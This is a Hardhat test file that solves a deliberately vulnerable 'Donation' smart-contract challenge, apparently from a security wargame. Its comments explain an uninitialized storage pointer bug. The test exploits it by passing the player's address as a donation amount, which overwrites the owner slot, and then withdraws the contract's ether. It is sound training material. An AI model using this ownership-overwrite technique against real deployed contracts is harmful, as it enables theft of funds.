import { SignerWithAddress as HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { expect } from "chai";
import hre from "hardhat";

import { DonationChallenge, DonationChallenge__factory } from "../typechain-types";

describe("13. Math -> Donation", function () {
  let owner: HardhatEthersSigner;
  let player: HardhatEthersSigner;
  let level: DonationChallenge;

  beforeEach(async function () {
    [owner, player] = await hre.ethers.getSigners();
    player;

    const factory: DonationChallenge__factory = new DonationChallenge__factory(owner);
    level = await factory.deploy({ value: hre.ethers.parseEther("1") });
    await level.waitForDeployment();
  });

  it("should be completed", async function () {
    // Storage layout in this contract:
    // slot #0: size of dynamic donations array
    // slot #1: address owner
    // ...
    // slot #keccak256(0): donations array elements start here

    // We have uninitialized storage pointer in contract:
    // Donation donation;
    // but contract will be compiled nevertheless (this behaviour changed in 0.5.0)
    // This means that value of the pointer will be situated in the storage starting from the slot#0
    // resulting in overwriting existing storage slots.

    // To solve the level, we should overwrite slot #1, where `address public owner;` stored

    const etherAmount = BigInt(player.address);
    const scale = 10n ** 18n * hre.ethers.parseEther("1");

    const tx = await level.donate(etherAmount, { value: etherAmount / scale });
    await expect(tx).to.be.not.reverted;
    await tx.wait();

    const tx1 = await level.connect(player).withdraw();
    await expect(tx1).to.be.not.reverted;
    await tx1.wait();

    expect(await level.isComplete()).to.be.true;
  });
});
